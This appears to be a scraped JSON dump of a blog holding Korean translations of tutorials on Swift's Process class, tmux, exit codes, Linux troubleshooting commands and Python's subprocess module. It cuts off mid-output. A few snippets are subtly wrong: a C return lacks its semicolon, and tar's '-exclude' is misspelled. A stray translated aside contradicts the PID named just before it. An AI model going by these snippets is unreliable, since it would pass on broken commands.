백그라운드에서 실행되는 이러한 함수를 호출할 수 있습니다. 예를 들어 ~/Public 폴더에서 파일을 제공하는 Python HTTP 서버를 시작할 수 있습니다.\n\n```swift\nexecuteDaemonProcess(\"/usr/bin/python3 -m http.server -d ~/Public\")\n```\n\n이 프로세스를 실행하면 ~/Public 폴더에서 파일을 제공하는 http://localhost:8080의 웹 서버가 생성됩니다.\n\n\n\n<div class=\"content-ad\"></div>\n\n# 결론\n\nProcess 클래스를 사용하여 Swift 프로젝트에서 셸 명령 실행을 원활하게 통합할 수 있습니다. 이 기술을 사용하면 Swift 프로젝트 내에서 커맨드 라인 프로그램 및 RPC의 프론트 엔드를 만들거나 자동화 및 시스템 수준 스크립팅을 수행하는 다양한 가능성이 열립니다.\n\n실제 구현에서는 강제 언래핑을 사용하고 모든 잠재적인 오류 및 예외 상황을 처리해야 함을 기억하세요. 위 예제는 모든 실패 시나리오를 처리하지 않으므로 주의해야 합니다.\n\n","ogImage":{"url":"/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_0.png"},"coverImage":"/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_0.png","tag":["Tech"],"readingTime":6},{"title":"tmux 초보자를 위한 가이드","description":"","date":"2024-05-23 15:12","slug":"2024-05-23-ABeginnersGuidetotmux","content":"\n<img src=\"/assets/img/2024-05-23-ABeginnersGuidetotmux_0.png\" />\n\n<img src=\"/assets/img/2024-05-23-ABeginnersGuidetotmux_1.png\" />\n\n```js\n이 기사에서는:\n- tmux 설치\n- tmux 시작하기\n- 기본 tmux 단축키\n- 마우스 사용하기\n- tmux 구성\n- 상태 표시줄 사용자 정의\n- 다음 단계\n```\n\nTmux는 터미널 멀티플렉서로, 하나의 터미널에서 여러 \"가상 터미널\"을 생성할 수 있습니다. 이는 단일 연결로 여러 프로그램을 실행할 때 매우 유용합니다. 특히 SSH를 사용하여 원격으로 컴퓨터에 연결할 때 유용합니다.\n\n<div class=\"content-ad\"></div>\n\nTmux은 또한 프로그램을 주요 터미널에서 분리하여 우연한 연결 해제로부터 보호합니다. 현재 터미널에서 tmux를 분리할 수 있으며, 모든 프로그램이 안전하게 백그라운드에서 실행되어 계속됩니다. 나중에는 동일한 또는 다른 터미널에 tmux를 다시 연결할 수 있습니다.\n\n원격 연결의 이점 외에도 tmux의 속도와 유연성으로 인해 로컬 장치에서 여러 터미널을 관리하기 위한 훌륭한 도구로 사용할 수 있습니다. 저는 내 노트북에서 8년 이상 tmux를 사용해왔습니다. 제 생산성을 높이고 도와주는 tmux의 몇 가지 기능은 다음과 같습니다:\n\n- 완전히 사용자 지정 가능한 상태 표시줄\n- 여러 창 관리\n- 여러 패널로 창 분할\n- 자동 레이아웃\n- 패널 동기화\n- 사용자 정의 tmux 세션 만들기가 가능한 스크립팅 기능\n\n다음은 사용자 지정 tmux 세션의 예시입니다:\n\n<div class=\"content-ad\"></div>\n\n\n![tmux](/assets/img/2024-05-23-ABeginnersGuidetotmux_2.png)\n\nTmux은 Screen에서 발견되는 일부 기능과 동일한 기능을 제공하며 일부 Linux 배포판에서는 더 이상 사용되지 않습니다. Tmux는 Screen보다 더 현대적인 코드 베이스를 갖추었으며 추가적인 사용자 정의 기능을 제공합니다.\n\n이제 몇 가지 tmux의 이점을 알았으니, 설치 및 사용 방법을 보여드리겠습니다.\n\n# tmux 설치\n\n\n<div class=\"content-ad\"></div>\n\n티먹스는 Fedora 및 Red Hat Enterprise Linux (RHEL) 표준 저장소에서 RHEL 8부터 사용할 수 있습니다. 다음 명령어로 설치할 수 있어요.\n\n```js\n$ sudo dnf -y install tmux\n```\n\n다른 많은 리눅스 배포판에서도 사용할 수 있으며, 선호하는 배포판 패키지 관리자를 사용하여 설치할 수 있을 거에요. 다른 운영 체제의 경우, tmux 설치 가이드를 참고하세요.\n\n# 티먹스 시작하기\n\n<div class=\"content-ad\"></div>\n\ntmux를 사용하려면 터미널에 tmux를 입력하세요. 이 명령은 tmux 서버를 시작하고 기본 세션(번호 0)과 하나의 창을 생성한 후 해당 세션에 연결합니다.\n\n```js\n$ tmux\n```\n\n<img src=\"/assets/img/2024-05-23-ABeginnersGuidetotmux_3.png\" />\n\ntmux에 연결되었으므로 일반적으로 명령이나 프로그램을 실행할 수 있습니다. 예를 들어, 긴 시간이 걸리는 프로세스를 시뮬레이션하려면:\n\n<div class=\"content-ad\"></div>\n\n```js\n$ c=1\n\n$ while true; do echo \"Hello $c\"; let c=c+1; sleep 1; done\nHello 1\nHello 2\nHello 3\n```\n\nTmux 세션에서 분리하려면 Ctrl+B를 누르고 D를 누르세요. Tmux는 \"접두사\" 조합을 눌러 트리거되는 일련의 키 바인딩(키보드 단축키)를 사용하여 작동합니다. 기본적으로 \"접두사\"는 Ctrl+B입니다. 그 다음에 현재 세션에서 분리하려면 D를 누르세요.\n\n```js\n[session 0에서 분리됨]\n```\n\n더 이상 세션에 연결되어 있지 않지만 오랫동안 실행되는 명령이 안전하게 백그라운드에서 실행됩니다. 활성 tmux 세션을 tmux ls로 나열할 수 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```plaintext\n$ tmux ls\n\n0: 1개의 창 (2022년 8월 27일 토요일 생성)\n```\n\n여기서 SSH 연결을 해제할 수 있고 명령은 계속 실행됩니다. 준비가 되면 서버에 다시 연결하여 기존 tmux 세션에 다시 연결하여 이전에 중단한 곳에서 계속할 수 있습니다:\n\n```plaintext\n$ tmux attach -t 0\n안녕 72\n안녕 73\n안녕 74\n안녕 75\n안녕 76\n^C\n```\n\n메시지가 계속 출력되는 것을 확인할 수 있습니다. 취소하려면 Ctrl+C를 입력하실 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n모든 tmux 명령어는 약어로도 사용할 수 있습니다. 예를 들어, tmux attach 대신에 tmux a를 입력해도 작동합니다.\n\n이 기능 자체만으로도 tmux는 훌륭한 도구입니다. 더욱이 기본 키바인딩을 포함하여 더 많은 기능을 제공합니다.\n\n# 기본 tmux 키바인딩\n\nTmux는 tmux 세션에서 빠르게 명령어를 실행할 수 있게 해주는 여러 키바인딩을 제공합니다. 가장 유용한 몇 가지를 소개합니다.\n\n<div class=\"content-ad\"></div>\n\n별도의 tmux 세션을 생성하려면 이미 tmux 세션에 들어가 있지 않은 경우 새로운 tmux 세션을 생성하세요. 새 세션을 만들 때 tmux new 명령을 사용하고 -s '이름' 매개변수를 전달하여 세션의 이름을 지정할 수 있습니다:\n\n```js\n$ tmux new -s Session1\n```\n\n```js\n+=========================+=============================================+\n|       Keybinding        |                 Description                 |\n+=========================+=============================================+\n| Ctrl+B D                | 현재 세션에서 분리하기                       |\n+-------------------------+---------------------------------------------+\n| Ctrl+B %                | 창을 수평으로 2개 패널로 분할하기            |\n+-------------------------+---------------------------------------------+\n| Ctrl+B \"                | 창을 수직으로 2개 패널로 분할하기            |\n+-------------------------+---------------------------------------------+\n| Ctrl+B 화살표 키       | 패널 간 이동                               |\n|  (왼쪽,오른쪽,위,아래) |                                             |\n+-------------------------+---------------------------------------------+\n| Ctrl+B X                | 패널 닫기                                  |\n+-------------------------+---------------------------------------------+\n| Ctrl+B C                | 새 창 만들기                               |\n+-------------------------+---------------------------------------------+\n| Ctrl+B N (또는 P)       | 다음 창 또는 이전 창으로 이동               |\n+-------------------------+---------------------------------------------+\n| Ctrl+B 0 (1,2...)       | 특정 번호의 창으로 이동                    |\n+-------------------------+---------------------------------------------+\n| Ctrl+B :                | 명령을 입력할 명령 줄로 이동합니다.         |\n|                         | 탭 자동 완성 사용 가능                      |\n+-------------------------+---------------------------------------------+\n| Ctrl+B ?                | 모든 키 바인딩 보기. \"Q\"를 눌러 종료        |\n+-------------------------+---------------------------------------------+\n| Ctrl+B W                | 여러 세션의 창 간 이동을 위한 패널 열기    |\n+-------------------------+---------------------------------------------\n```\n\n추가 키 바인딩은 tmux 매뉴얼 페이지를 참조하세요.\n\n<div class=\"content-ad\"></div>\n\n# 마우스 사용하기\n\n티먹스는 주로 키보드와 함께 사용되며, 여러 키 바인딩을 제공하여 명령을 실행하고 새 창을 만들고 크기를 조정하는 것을 더 쉽게 할 수 있습니다. 마우스를 선호한다면, 티먹스도 그것을 허용합니다. 그러나 기본적으로 마우스는 비활성화되어 있습니다. 활성화하려면 먼저 Ctrl+B :를 입력하여 명령 모드로 진입한 후 set -g mouse 명령을 사용하여 마우스를 켜거나 끌 수 있습니다.\n\n이제 마우스를 사용하여 창과 창 사이를 전환하고 크기를 조정할 수 있습니다. 티먹스 버전 3부터는 마우스로 오른쪽 클릭하여 콘텍스트 메뉴를 열 수도 있습니다:\n\n![image](/assets/img/2024-05-23-ABeginnersGuidetotmux_4.png)\n\n<div class=\"content-ad\"></div>\n\n마우스 커서 아래 화면 내용에 따라 메뉴가 변합니다.\n\n# tmux 구성하기\n\ntmux 구성을 영구적으로 변경할 수 있습니다. tmux 구성 파일을 수정하여 변경할 수 있습니다. 기본적으로 이 파일은 $HOME/.tmux.conf에 위치합니다.\n\n예를 들어, 기본 접두표 키 조합은 Ctrl+B이지만 때로는 이 조합을 누르기가 조금 어색하고 양손이 필요할 수도 있습니다. 구성 파일을 편집하여 다른 키로 변경할 수 있습니다. 저는 접두표 키를 Ctrl+A로 설정하는 것을 좋아합니다. 이를 위해 새 구성 파일을 만들어 다음 라인을 추가하면 됩니다:\n\n<div class=\"content-ad\"></div>\n\n```sh\n$ vi $HOME/.tmux.conf\n\n# Prefix를 Ctrl+a로 설정합니다.\nset -g prefix C-a\n\n# 이전 Prefix 설정을 제거합니다.\nunbind C-b\n\n# 두 번 눌러 애플리케이션에 Ctrl+a를 전송합니다.\nbind C-a send-prefix\n\n:wq\n```\n\n이 머신에서 tmux 세션을 시작할 때는 Ctrl+A를 눌러 위에 나열된 명령을 실행할 수 있습니다. 설정 파일을 사용하여 다른 tmux 키바인딩 및 명령을 변경하거나 추가할 수 있습니다.\n\n# 상태 표시줄 사용자 정의\n\nTmux의 상태 표시줄은 완벽하게 사용자 정의할 수 있습니다. 각 섹션의 색상 및 표시 내용을 변경할 수 있습니다. 이러한 많은 옵션이 있기 때문에 다룰 내용이 또 다른 기사가 필요할 정도이지만, 기초부터 시작하겠습니다.\n\n\n\n<div class=\"content-ad\"></div>\n\n상태 표시줄 전체에 대한 표준 녹색 색상 때문에 각 섹션을 구별하기 어려울 수 있습니다. 특히 열려 있는 창의 수와 활성 창을 파악하기가 어려울 수 있습니다.\n\n![image](/assets/img/2024-05-23-ABeginnersGuidetotmux_5.png)\n\n상태 표시줄 색상을 업데이트하여 이를 변경할 수 있습니다. 먼저 Ctrl+B를 입력하여 명령 모드로 전환하십시오. (또는 위에서 접두어 구성 변경을 했다면 Ctrl+A를 입력하십시오.) 그런 다음 다음 명령어로 색상을 변경하십시오:\n\n- 상태 표시줄 배경색 변경: set -g status-bg cyan\n- 비활성 창 색상 변경: set -g window-status-style bg=yellow\n- 활성 창 색상 변경: set -g window-status-current-style bg=red,fg=white\n\n<div class=\"content-ad\"></div>\n\n영구적 변경을 위해 해당 명령을 구성 파일에 추가해보세요.\n\n이 구성이 적용되면 상태 표시줄이 더 멋지게 보이고 현재 활성 창을 쉽게 식별할 수 있습니다:\n\n![tmux status bar](/assets/img/2024-05-23-ABeginnersGuidetotmux_6.png)\n\n# 다음은 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\nTmux은 원격 연결을 보호하는 데 탁월한 도구이며 터미널을 오랜 시간 사용할 때 유용합니다. 이 기사에서는 기본 기능에 대해서만 다루고 있으며 더 많은 것을 탐험할 수 있습니다. tmux에 대한 추가 정보는 공식 위키 페이지를 참조하십시오.\n\n더 많은 명령을 추가하고 Vim과 같은 응용 프로그램과 통합되고 상태 표시줄에 새로운 기능을 추가하는 추가 비공식 플러그인으로 tmux의 기능을 확장할 수도 있습니다. 더 많은 정보는 tmux 플러그인 프로젝트를 참조하십시오.\n\nThe Pragmatic Bookshelf에서 출판된 Ricardo의 책을 확인해 보세요.\n\nGo 프로그래밍 언어로 직접 빠르고 신뢰할 수 있으며 크로스 플랫폼 명령 줄 도구를 작성해 보세요.\n\n<div class=\"content-ad\"></div>\n\n![2024-05-23-ABeginnersGuidetotmux_7](/assets/img/2024-05-23-ABeginnersGuidetotmux_7.png)\n\n","ogImage":{"url":"/assets/img/2024-05-23-ABeginnersGuidetotmux_0.png"},"coverImage":"/assets/img/2024-05-23-ABeginnersGuidetotmux_0.png","tag":["Tech"],"readingTime":8},{"title":"이번 글에서는 종료 코드 0이란 무엇이며 왜 반환되는지에 대해 알아보겠습니다","description":"","date":"2024-05-23 15:11","slug":"2024-05-23-Whatisexitcode0andwhyisreturned","content":"\n\n프로그래밍의 복잡한 세계에서는 종료 코드를 이해하는 것이 코드 실행의 동작과 결과를 이해하는 데 중요합니다. 이 연구에서는 종료 코드 0의 중요성을 해석하여 다양한 프로그래밍 언어에서의 영향을 알아보고, 프로그램 종료의 기본 메커니즘을 밝힐 것입니다.\n\n다음 예시를 살펴봅시다:\n\n```js\nint main() {\n  return 0\n}\n```\n\n<div class=\"content-ad\"></div>\n\n```js\ngcc main.c -o main\n```\n\n이 간단한 C 프로그램에서 return 0; 문은 종료 코드 0으로 프로그램을 종료함을 나타냅니다.\n\n비슷한 맥락에서, Node.js에서 종료 코드가 처리되는 방법을 살펴보죠:\n\n```js\nprocess.exit()\n```\n\n<div class=\"content-ad\"></div>\n\n이번 탐구에서 우리는 bash의 유용한 기능에 초점을 맞춰볼 거에요. 이 기능을 통해 우리는 명령어나 프로그램의 이전 반환 상태를 확인할 수 있어요.\n\n```js\necho $?\n```\n\n두 프로그램을 실행한 결과 모두 0이에요.\n\n# 종료 코드 0: 성공의 보편적 상징\n\n<div class=\"content-ad\"></div>\n\n다양한 프로그래밍 언어, C 및 파생 버전을 포함하여, 0의 종료 코드는 오류 없이 성공적으로 실행되었음을 나타냅니다. 프로그램이 기대대로 작업을 완료하면 종료 코드 0을 반환하여 최종 사용자에게 모든 것이 순조롭게 진행되었다는 것을 알립니다. 이 관례는 스크립트 및 자동화된 프로세스가 프로그램이 성공적으로 실행되었는지 또는 문제가 발생했는지를 확인할 수 있도록 합니다.\n\n하지만 아마도 이 프로그램이 어떻게 로드되는지 궁금할 것입니다. 알아보려고 해 봅시다. 우리 바이너리를 분해할 수 있는 objdump를 사용할 수 있습니다. 다음 명령어를 사용하십시오:\n\n```js\nobjdump -d -M intel main\n```\n\n<div class=\"content-ad\"></div>\n\n우리의 여정은 _start에서 시작되어 __libc_start_main을 거쳐 Linux에서 시스템 호출인 _exit으로 끝납니다.\n\nhttps://man7.org/linux/man-pages/man2/_exit.2.html\n\n운영 체제는 프로세스를 생성하고 종료하는 책임이 있음을 알 수 있습니다. Linux 커널에서 우리는 아래 이미지에서 보여지는 것처럼 프로세스를 시각화할 수 있습니다.\n\n![프로세스 시각화](/assets/img/2024-05-23-Whatisexitcode0andwhyisreturned_1.png)\n\n<div class=\"content-ad\"></div>\n\nLinux에서 사용되는 다른 내부 코드들을 언급할 수 있어요.\n\n```js\n#define EPERM   1 /* Operation not permitted */\n#define ENOENT   2 /* No such file or directory */\n#define ESRCH   3 /* No such process */\n#define EINTR   4 /* Interrupted system call */\n#define EIO   5 /* I/O error */\n#define ENXIO   6 /* No such device or address */\n#define E2BIG   7 /* Argument list too long */\n#define ENOEXEC   8 /* Exec format error */\n#define EBADF   9 /* Bad file number */\n#define ECHILD  10 /* No child processes */\n#define EAGAIN  11 /* Try again */\n#define ENOMEM  12 /* Out of memory */\n#define EACCES  13 /* Permission denied */\n#define EFAULT  14 /* Bad address */\n#define ENOTBLK  15 /* Block device required */\n#define EBUSY  16 /* Device or resource busy */\n#define EEXIST  17 /* File exists */\n#define EXDEV  18 /* Cross-device link */\n#define ENODEV  19 /* No such device */\n#define ENOTDIR  20 /* Not a directory */\n#define EISDIR  21 /* Is a directory */\n#define EINVAL  22 /* Invalid argument */\n#define ENFILE  23 /* File table overflow */\n#define EMFILE  24 /* Too many open files */\n#define ENOTTY  25 /* Not a typewriter */\n#define ETXTBSY  26 /* Text file busy */\n#define EFBIG  27 /* File too large */\n#define ENOSPC  28 /* No space left on device */\n#define ESPIPE  29 /* Illegal seek */\n#define EROFS  30 /* Read-only file system */\n#define EMLINK  31 /* Too many links */\n#define EPIPE  32 /* Broken pipe */\n#define EDOM  33 /* Math argument out of domain of func */\n#define ERANGE  34 /* Math result not representable */\n```\n\n# 결론\n\nC의 main 함수나 Node.js나 다른 프로그래밍 언어에서 process.exit를 사용할 때, 프로그래머가 정의한 종료 코드로 프로세스를 닫기 위해 _exit 시스템 호출이 내부적으로 사용됩니다. 그러나 프로그래머로서 여러분은 프로세스의 적절한 종료와 종료된 프로세스에 대한 사용자에게 가장 좋은 결과를 제공하기 위한 책임이 있습니다.","ogImage":{"url":"/assets/img/2024-05-23-Whatisexitcode0andwhyisreturned_0.png"},"coverImage":"/assets/img/2024-05-23-Whatisexitcode0andwhyisreturned_0.png","tag":["Tech"],"readingTime":4},{"title":"리눅스 시스템을 위한 10가지 문제 해결 명령어","description":"","date":"2024-05-23 15:10","slug":"2024-05-23-10TroubleshootingCommandsforLinuxSystems","content":"\n\n Markdown\n![이미지](/assets/img/2024-05-23-10TroubleshootingCommandsforLinuxSystems_0.png)\n\n# 1. CPU를 가장 많이 사용하는 프로세스 확인하는 방법\n\n```js\n$ ps H -eo pid,pcpu | sort -nk2 | tail\n31396  0.6\n31396  0.6\n31396  0.6\n31396  0.6\n31396  0.6\n31396  0.6\n31396  0.6\n31396  0.6\n30904  1.0\n30914  1.0\n```\n\n가장 CPU를 많이 사용하는 PID는 30914입니다. 음성오버: 실제로는 31396입니다.\n\n\n<div class=\"content-ad\"></div>\n\n# 2. 가장 CPU 소모가 많은 프로세스의 PID에 해당하는 서비스 이름은 무엇인가요?\n\n첫 번째 방법:\n\n```js\n$ ps aux | fgrep 30914\nwork 30914  1.0  0.8 309568 71668 ?  Sl   Feb02 124:44 ./router2 –conf=rs.conf\n```\n\n해당 프로세스는 ./router2입니다.\n\n<div class=\"content-ad\"></div>\n\n번호 두 방법:\n\n```js\n$ ll /proc/30914\nlrwxrwxrwx  1 work work 0 2월 10일 13:27 cwd -> /home/work/im-env/router2\nlrwxrwxrwx  1 work work 0 2월 10일 13:27 exe -> /home/work/im-env/router2/router2\n```\n\n음성 안내: 멋져요, 전체 경로가 모두 나와 있네요.\n\n# 3. 특정 포트의 연결 상태를 확인하는 방법은 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\nMethod One:\n\n```js\n$ netstat -lap | fgrep 22022\ntcp        0      0 1.2.3.4:22022          *:*                         LISTEN      31396/imui\ntcp        0      0 1.2.3.4:22022          1.2.3.4:46642          ESTABLISHED 31396/imui\ntcp        0      0 1.2.3.4:22022          1.2.3.4:46640          ESTABLISHED 31396/imui\n```\n\nMethod Two:\n\n```js\n$ /usr/sbin/lsof -i :22022\nCOMMAND   PID USER   FD   TYPE   DEVICE SIZE NODE NAME\nrouter  30904 work   50u  IPv4 69065770       TCP 1.2.3.4:46638->1.2.3.4:22022 (ESTABLISHED)\nrouter  30904 work   51u  IPv4 69065772       TCP 1.2.3.4:46639->1.2.3.4:22022 (ESTABLISHED)\nrouter  30904 work   52u  IPv4 69065774       TCP 1.2.3.4:46640->1.2.3.4:22022 (ESTABLISHED)\n```\n\n<div class=\"content-ad\"></div>\n\n# 4. 기계의 연결 수를 확인하는 방법은?\n\n1.2.3.4의 SSH 데몬(sshd)이 22번 포트에서 수신 대기 중입니다. 1.2.3.4의 sshd 서비스에 대한 다양한 상태의 연결 수 (TIME_WAIT/CLOSE_WAIT/ESTABLISHED)를 어떻게 카운트할 수 있을까요?\n\n```js\n$ netstat -n | grep 1.2.3.4:22 | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'\n\n$ netstat -lnpta | grep ssh | egrep \"TIME_WAIT | CLOSE_WAIT | ESTABLISHED\"\n```\n\n참고: netstat은 네트워크 연결 문제를 추적하는 데 자주 사용되는 도구이며, grep/awk와 결합하면 강력한 도구가 됩니다.\n\n<div class=\"content-ad\"></div>\n\n# 5. 사전 백업 로그에서 데이터 쿼리하기\n\n사전 백업 서비스.2022-06-26.log.bz2 로그에서 키워드 1.2.3.4을 포함하는 항목은 몇 개인가요?\n\n```js\n$ bzcat service.2022-06-26.log.bz2 | grep '1.2.3.4' | wc -l\n\n$ bzgrep '1.2.3.4' service.2022-06-26.log.bz2 | wc -l\n\n$ less service.2022-06-26.log.bz2 | grep '10.37.9.11' | wc -l\n```\n\n참고: 온라인 로그 파일은 일반적으로 bz2로 압축된 후 보존됩니다. 쿼리를 위해 해제하면 많은 공간과 시간이 소비됩니다. 따라서, 연구 및 개발 동료들이 숙달해야할 bzcat 및 bzgrep는 필수 도구입니다.\n\n<div class=\"content-ad\"></div>\n\n# 6. 백업 서비스 팁\n\n백업을 위해 /opt/web/service_web 디렉토리를 패킹하되 로그 디렉토리는 제외하고, 패킹한 파일을 /opt/backup 디렉토리에 저장하세요.\n\n```js\n$ tar -zcvf /opt/backup/service_web.tar.gz \\\n    -exclude /opt/web/service_web/logs \\\n    /opt/web/service_web\n```\n\n참고: 이 명령은 온라인 애플리케이션에서 흔히 사용됩니다. 프로젝트를 패킹하고 이전해야 할 때 로그 디렉토리를 제외해야 할 때가 종종 있습니다. 이런 시나리오에서는 `exclude` 매개변수를 잘 활용하는 것이 중요합니다.\n\n<div class=\"content-ad\"></div>\n\n# 7. 쓰레드 카운트 조회\n\n서버의 서비스를 위해 실행 중인 전체 쓰레드 수를 조회합니다. 기계의 쓰레드 수가 경고 임계값을 초과할 때 해당 프로세스와 쓰레드 정보를 빠르게 식별해야 합니다.\n\n```js\n$ ps -eLf | wc -l\n\n$ pstree -p | wc -l\n```\n\n# 8. 디스크 경고, 가장 큰 파일 비우기\n\n<div class=\"content-ad\"></div>\n\n많은 예외 로그 파일을 찾아 서버에서 실행 중인 Tomcat 서버에서 생성된 파일을 공간을 확보하세요. 파일에 \"log\" 키워드가 포함되어 있고 1GB보다 큰 경우를 가정합니다.\n\n단계 1: 파일 찾기.\n\n```js\n$ find / -type f -name \"*log*\" | xargs ls -lSh | more\n\n$ du -a / | sort -rn | grep log | more\n\n$ find / -name '*log*' -size +1000M -exec du -h {} \\;\n```\n\n단계 2: 파일을 비우기.\n\n<div class=\"content-ad\"></div>\n\n가정적으로 찾은 파일이 a.log인 경우, 해당 파일을 완전히 비우는 올바른 방법은:\n\n```js\n$ echo \"\" > a.log\n```\n\n이렇게 하면 파일 공간이 즉시 해제됩니다.\n\n많은 사람들이 사용하는 방법:\n\n<div class=\"content-ad\"></div>\n\n```js\n$ rm -rf a.log\n```\n\n파일을 삭제하면서도 Tomcat 서비스가 여전히 실행 중인 경우 공간이 즉시 해제되지 않을 수 있습니다. 공간을 확보하려면 Tomcat을 다시 시작해야 합니다.\n\n# 9. 파일 표시, 주석 필터링\n\n서버.conf 파일을 표시하고 #로 시작하는 주석 줄을 마스킹합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n$ sed -n '/^[#]/!p' server.conf\n\n$ sed -e '/^#/d' server.conf\n\n$ grep -v \"^#\" server.conf\n```\n\n# 10. 디스크 IO 예외 해결 방법\n\n디스크 IO 예외, 예를 들어 느린 쓰기 또는 높은 현재 사용량과 같은 문제를 해결하는 방법을 알아보세요. 높은 디스크 IO 예외를 일으키는 프로세스 ID를 식별해야 합니다.\n\n단계 1:\n\n<div class=\"content-ad\"></div>\n\n```sh\n$ iotop -o\n```\n\n현재 디스크에 쓰기 중인 모든 프로세스 ID를 보십시오.\n\n단계 2: 만약 쓰기 표시기가 낮고 주요 쓰기 작업이 거의 없다면, 디스크 자체를 확인해야 합니다. 시스템을 확인할 수 있습니다.\n\n```sh\n$ dmesg\n```\n\n<div class=\"content-ad\"></div>\n\n차후에 한 번 `/var/log/message` 파일을 확인해보세요. 여기에 어떤 디스크 오류 메시지가 있는지 확인할 수 있어요. 동시에, 쓰기 속도가 느린 디스크에 빈 파일을 만들어보세요. 디스크의 고장으로 인해 쓰기가 안 되는지 확인할 수 있어요.","ogImage":{"url":"/assets/img/2024-05-23-10TroubleshootingCommandsforLinuxSystems_0.png"},"coverImage":"/assets/img/2024-05-23-10TroubleshootingCommandsforLinuxSystems_0.png","tag":["Tech"],"readingTime":5},{"title":"파이썬에서 쉘 명령어를 올바르게 실행하는 방법","description":"","date":"2024-05-23 15:08","slug":"2024-05-23-TheRightWaytoRunShellCommandsFromPython","content":"\n<img src=\"/assets/img/2024-05-23-TheRightWaytoRunShellCommandsFromPython_0.png\" />\n\n파이썬은 모든 것을 자동화하는 데 인기 있는 선택지입니다. 이는 시스템 관리 작업을 자동화하거나 다른 프로그램을 실행하거나 운영 체제와 상호 작용하는 작업을 포함합니다. 그러나 파이썬에서 이를 수행하는 많은 방법이 있습니다. 대부분은 논란이 될 수 있는 방법입니다.\n\n그래서 이 기사에서는 다른 프로세스를 실행하는 데 사용할 수 있는 파이썬 옵션을 모두 살펴볼 것입니다. 나쁜 방법, 좋은 방법, 그리고 무엇보다도 올바른 방법을 중점적으로 살펴보겠습니다.\n\n# 옵션들\n\n<div class=\"content-ad\"></div>\n\n파이썬은 다른 프로그램과 상호 작용하는 내장 옵션이 너무 많습니다. 그 중에서도 어떤 것은 좋고 나쁨이 있지만 솔직히 말해서 나는 어느 것도 좋아하지 않아요. 각 옵션을 빠르게 살펴보고 특정 모듈을 사용해야 하는 시점(있는 경우)을 확인해 봅시다.\n\n# 내장 도구\n\n일반적인 지침은 다른 프로그램이나 OS 명령을 직접 호출하는 대신 기본 기능을 사용하는 것이어야 합니다. 그래서 먼저 파이썬의 기본 옵션을 살펴보겠습니다:\n\n- pathlib — 파일/디렉토리를 생성하거나 삭제해야 하거나 파일이 존재하는지 확인하거나 권한을 변경해야 할 때는 시스템 명령을 실행할 이유가 없습니다. 단순히 pathlib을 사용하세요. 필요한 모든 것이 포함되어 있습니다. pathlib를 사용하기 시작하면 glob이나 os.path와 같은 다른 파이썬 모듈을 잊을 수 있다는 것을 깨닫게 될 거예요.\n- tempfile — 비슷하게, 임시 파일이 필요할 때는 tempfile 모듈을 사용하세요. /tmp에 수동으로 접근할 필요가 없습니다.\n- shutil — pathlib은 파이썬에서 대부분의 파일 관련 요구 사항을 충족할 것입니다. 그러나 파일을 복사하거나 이동하거나 chown 또는 아카이브를 생성해야 하는 경우에는 shutil을 사용해야 합니다.\n- signal — 신호 핸들러를 사용해야 하는 경우에 필요합니다.\n- syslog — Unix syslog에 대한 인터페이스를 위해 사용합니다.\n\n<div class=\"content-ad\"></div>\n\n만약 위에 제공된 내장 옵션들 중에서 아무것도 원하는 대로 만족스럽지 않다면, 그때만 운영 체제나 다른 프로그램과 직접 상호 작용하는 것이 의미가 있습니다.\n\n# OS 모듈\n\n최악의 옵션부터 시작해서 os 모듈은 운영 체제와 상호 작용하기 위한 저수준 함수를 제공하지만, 많은 함수들이 다른 모듈에서 대체되었습니다.\n\n단순히 다른 프로그램을 호출하고 싶다면 os.system 함수를 사용할 수 있지만, 사용하면 안 됩니다. 당신에게 예시를 들어 주고 싶지 않아요, 왜냐하면 그냥 사용하지 말아야 하기 때문입니다.\n\n<div class=\"content-ad\"></div>\n\nos는 처음 선택하긴 좋지 않지만, 유용하게 사용할 수 있는 몇 가지 함수가 있습니다:\n\n```js\nimport os\n\nprint(os.getenv('PATH'))\n# /home/martin/.local/bin:/usr/local/sbin:/usr/local/bin:...\nprint(os.uname())\n# posix.uname_result(sysname='Linux', nodename='...', release='...', version='...', machine='x86_64')\nprint(os.times())\n# posix.times_result(user=0.01, system=0.0, children_user=0.0, children_system=0.0, elapsed=1740.63)\nprint(os.cpu_count())\n# 16\nprint(os.getloadavg())\n# (2.021484375, 2.35595703125, 2.04052734375)\nold_umask = os.umask(0o022)\n# 파일 처리...\nos.umask(old_umask)  # 이전 umask로 되돌리기\n\n# 'random' 모듈의 의사 난수보다 더 좋은 난수가 필요한 경우에만 사용하세요:\nfrom base64 import b64encode\n\nrandom_bytes = os.urandom(64)\nprint(b64encode(random_bytes).decode('utf-8'))\n# C2F3kHjdzxcP7461ETRj/YZredUf+NH...hxz9MXXHJNfo5nXVH7e5olqLwhahqFCe/mzLQ==\n```\n\n위에 설명된 함수들 외에도, fd(파일 기술자), 파이프, PTY 열기, chroot, chmod, mkdir, kill, stat을 생성하는 함수들이 있지만, 더 좋은 옵션이 있기 때문에 사용을 권장하지 않습니다. 심지어 os.popen, os.spawn 또는 os.system을 사용하지 않도록 docs에 나온 부분에서 os를 subprocess 모듈로 대체하는 방법을 보여줍니다.\n\n파일/경로 작업에 os 모듈을 사용하지 말아주세요. os.path 및 기타 경로 관련 함수 대신 pathlib를 사용하는 방법에 대한 전체 섹션이 있습니다.\n\n<div class=\"content-ad\"></div>\n\nos 모듈의 대부분의 남은 함수는 OS(또는 C 언어) API에 직접적으로 연결되어 있습니다. 예를 들어 os.dup, os.splice, os.mkfifo, os.execv, os.fork 등이 있습니다. 이러한 모든 함수를 사용해야 한다면 파이썬이 그 작업에 적합한 언어인지 확신하지 못합니다.\n\n# 서브프로세스 모듈\n\n파이썬에서 두 번째 — 약간 나은 — 옵션은 서브프로세스 모듈입니다. 아래는 서브프로세스 모듈의 예시입니다:\n\n```js\nimport subprocess\n\np = subprocess.run('ls -l', shell=True, check=True, capture_output=True, encoding='utf-8')\n\n# 'p'는 'CompletedProcess(args='ls -la', returncode=0)'의 인스턴스입니다\nprint(f'Command {p.args} exited with {p.returncode} code, output: \\n{p.stdout}')\n# Command ls -la exited with 0 code\n\n# total 36\n# drwxrwxr-x  2 martin martin  4096 apr 22 12:53 .\n# drwxrwxr-x 42 martin martin 20480 apr 22 11:01 ..\n# 